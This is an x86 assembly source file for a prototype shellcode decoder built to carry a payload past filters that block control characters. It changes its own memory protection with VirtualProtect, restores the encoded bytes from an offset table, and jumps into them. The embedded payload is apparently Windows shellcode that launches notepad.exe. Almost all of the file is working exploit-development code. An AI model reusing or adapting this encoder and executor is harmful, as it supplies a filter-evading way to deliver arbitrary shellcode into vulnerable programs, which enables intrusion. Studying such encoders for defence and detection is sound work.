;EasyCodeName=phobectrl,1
Comment~

...File: phobectrl.asm

Purpose: Prototype assembly project to test the decoding of 
		 a x86 payload which avoids control characters.

..Usage: phobectrl.py -h

########################################################################

Copyright 2018 (c) Vozzie <https://vozzie.be>

Permission is hereby granted, free of charge, to any person obtaining a 
copy of this software and associated documentation files (the 
"Software"), to deal in the Software without restriction, including 
without limitation the rights to use, copy, modify, merge, publish, 
distribute, sublicense, and/or sell copies of the Software, and to 
permit persons to whom the Software is furnished to do so, subject to 
the following conditions:

 * The above copyright notice, this list of conditions and the 
   following disclaimer shall be included in all copies or substantial 
   portions of the Software.
 * Redistributions in binary form must reproduce the above copyright
   notice, this list of conditions and the following disclaimer in the
   documentation and/or other materials provided with the distribution.
 * The name of Vozzie may not be used to endorse or promote products
   derived from this software without specific prior written permission.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS 
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY 
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, 
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

########################################################################
~ 

Nops Macro n
	IF n GE 1
		Repeat n
			Nop
		EndM
	ENDIF
EndM

.Code

decoder:

	; Get the instruction pointer
	Jmp getip

carry:

	; Set high bit after shift
	Or Dl, 080H

	; Continue
	Jmp carried

popip:

	; Esi = offset table
	Pop Esi

	; Ecx = 0FFFFFFFFH - sizeOf_table + 1
        ; Mov size to ecx
    Mov Ecx, 0ffffffbaH
    ; Mask size
	;And Ecx, 0ffffffbaH

	; Edi = payload
	Mov Edi, Esi
	Sub Edi, Ecx

	; Table word size into Ecx
	Neg Ecx
	Shr Ecx, 1

	; Ax = 07F7FH
	;Xor Eax, Eax
	;Dec Eax
	;Shr Al, 1
	;Shr Ah, 1

	;Xor Eax, Eax
	;Sub Eax, 080808080H

	; Ecx = 0
	Xor Edx, Edx

next:

	; Load offset of encoded byte
	Mov Dx, Word Ptr [Esi + Ecx * 2 - 2]

	; Remove bits
	And Dx, 07F7FH
	;And Dx, Ax

	; Seven upper bits
	Shr Dh, 1

	; Dl = Cary bit of Shr operation
	Jc carry

	; Nops if label isn't far enough
	Nops 32 - ($ - popip)

carried:

	; Decode byte
	And Byte Ptr [Edi + Edx], 07FH
	;And Byte Ptr [Edi + Edx], Ah

	; Decode next
	Loop next

	; Execute payload
	Jmp Edi

getip:

	Call popip ; pushes the address (of table) on the stack

table:

    ; Index table of encoded bytes
    DW 08083H
    DW 08084H
    DW 08085H
    DW 08091H
    DW 08094H
    DW 08098H
    DW 080A2H
    DW 080A7H
    DW 080A8H
    DW 080B0H
    DW 080B6H
    DW 080BAH
    DW 080C0H
    DW 080C4H
    DW 080CBH
    DW 080D2H
    DW 080D3H
    DW 080D9H
    DW 080E5H
    DW 080E9H
    DW 080EDH
    DW 080EEH
    DW 080F1H
    DW 080F3H
    DW 08185H
    DW 0818AH
    DW 0818EH
    DW 0818FH
    DW 08190H
    DW 081A6H
    DW 081A8H
    DW 081ADH
    DW 081B0H
    DW 081B4H
    DW 081C3H

payload:

    ; Encoded payload
    DB 0FCH
    DB 0E8H
    DB 082H
    DB 080H
    DB 080H
    DB 080H
    DB 060H
    DB 089H
    DB 0E5H
    DB 031H
    DB 0C0H
    DB 064H
    DB 08BH
    DB 050H
    DB 030H
    DB 08BH
    DB 052H
    DB 08CH
    DB 08BH
    DB 052H
    DB 094H
    DB 08BH
    DB 072H
    DB 028H
    DB 08FH
    DB 0B7H
    DB 04AH
    DB 026H
    DB 031H
    DB 0FFH
    DB 0ACH
    DB 03CH
    DB 061H
    DB 07CH
    DB 082H
    DB 02CH
    DB 020H
    DB 0C1H
    DB 0CFH
    DB 08DH
    DB 081H
    DB 0C7H
    DB 0E2H
    DB 0F2H
    DB 052H
    DB 057H
    DB 08BH
    DB 052H
    DB 090H
    DB 08BH
    DB 04AH
    DB 03CH
    DB 08BH
    DB 04CH
    DB 091H
    DB 078H
    DB 0E3H
    DB 048H
    DB 081H
    DB 0D1H
    DB 051H
    DB 08BH
    DB 059H
    DB 020H
    DB 081H
    DB 0D3H
    DB 08BH
    DB 049H
    DB 098H
    DB 0E3H
    DB 03AH
    DB 049H
    DB 08BH
    DB 034H
    DB 08BH
    DB 081H
    DB 0D6H
    DB 031H
    DB 0FFH
    DB 0ACH
    DB 0C1H
    DB 0CFH
    DB 08DH
    DB 081H
    DB 0C7H
    DB 038H
    DB 0E0H
    DB 075H
    DB 0F6H
    DB 083H
    DB 07DH
    DB 0F8H
    DB 03BH
    DB 07DH
    DB 024H
    DB 075H
    DB 0E4H
    DB 058H
    DB 08BH
    DB 058H
    DB 024H
    DB 081H
    DB 0D3H
    DB 066H
    DB 08BH
    DB 08CH
    DB 04BH
    DB 08BH
    DB 058H
    DB 09CH
    DB 081H
    DB 0D3H
    DB 08BH
    DB 084H
    DB 08BH
    DB 081H
    DB 0D0H
    DB 089H
    DB 044H
    DB 024H
    DB 024H
    DB 05BH
    DB 05BH
    DB 061H
    DB 059H
    DB 05AH
    DB 051H
    DB 0FFH
    DB 0E0H
    DB 05FH
    DB 05FH
    DB 05AH
    DB 08BH
    DB 092H
    DB 0EBH
    DB 08DH
    DB 05DH
    DB 06AH
    DB 081H
    DB 08DH
    DB 085H
    DB 0B2H
    DB 080H
    DB 080H
    DB 080H
    DB 050H
    DB 068H
    DB 031H
    DB 08BH
    DB 06FH
    DB 087H
    DB 0FFH
    DB 0D5H
    DB 0BBH
    DB 0F0H
    DB 0B5H
    DB 0A2H
    DB 056H
    DB 068H
    DB 0A6H
    DB 095H
    DB 0BDH
    DB 09DH
    DB 0FFH
    DB 0D5H
    DB 03CH
    DB 086H
    DB 07CH
    DB 08AH
    DB 080H
    DB 0FBH
    DB 0E0H
    DB 075H
    DB 085H
    DB 0BBH
    DB 047H
    DB 093H
    DB 072H
    DB 06FH
    DB 06AH
    DB 080H
    DB 053H
    DB 0FFH
    DB 0D5H
    DB 06EH
    DB 06FH
    DB 074H
    DB 065H
    DB 070H
    DB 061H
    DB 064H
    DB 02EH
    DB 065H
    DB 078H
    DB 065H
    DB 080H

start:

	; Setup stack frame
	Enter 4, 0

	; Call VirtualProtect, make code self modifiable
	Lea Eax, [Ebp - 4]
	Push Eax
	Push PAGE_EXECUTE_READWRITE
	Push start - decoder
	Push Offset decoder
	Call VirtualProtect

	; Break
;	Int 3

	; Goto decoder
	Jmp decoder

End start
